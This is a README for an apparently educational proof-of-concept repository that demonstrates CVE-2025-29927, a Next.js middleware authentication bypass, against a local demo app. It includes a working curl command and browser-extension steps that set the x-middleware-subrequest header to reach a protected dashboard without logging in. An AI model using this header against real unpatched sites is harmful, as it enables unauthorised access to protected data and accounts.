# Next.js Middleware Vulnerability POC

This project is a Proof of Concept (POC) for the article [**Critical Next.js Vulnerability: How a Simple Header Bypasses Authentication (CVE-2025-29927) 🕵️**](http://localhost:3000/blog/critical-nextjs-middleware-vulnerability-cve-2025-29927-authentication-bypass). It demonstrates how the [CVE-2025-29927](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw) vulnerability can be exploited to bypass middleware authentication and authorization checks in a Next.js application.

## Description

The vulnerability allows attackers to bypass Next.js middleware by adding a specific header (`x-middleware-subrequest`) to their requests. This can lead to unauthorized access to protected routes, CSP bypasses, and even DoS attacks via cache poisoning.

## How to Run

1. **Clone the Repository**

```bash
git clone https://github.com/neoxs/nextjs-middleware-vuln-poc.git
cd nextjs-middleware-vuln-poc
```

2. **Install Dependencies**

```bash
npm install
```

3. **Run the Application**

```bash
npm run dev
```

4. **Exploit the Vulnerability**

Open your browser and navigate to `http://localhost:3000/dashboard`. You should be redirected to the login page.

You can exploit this vulnerability using one of these methods:

**Using curl:**

```bash
curl -X GET http://localhost:3000/dashboard \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```

**Using a browser with modHeader extension (recommended):**

1. Install the [modHeader extension](https://modheader.com/) for your browser
2. Add a new header with name `x-middleware-subrequest` and value `middleware:middleware:middleware:middleware:middleware`
3. Navigate to `http://localhost:3000/dashboard` in your browser

You should now have direct access to the dashboard area without authentication.

## Important Note

This POC is for educational purposes only. The vulnerability has been patched in the latest versions of Next.js. Always ensure your applications are up-to-date and follow best security practices.

## License

This project is licensed under the MIT License. See the **LICENSE** file for details.
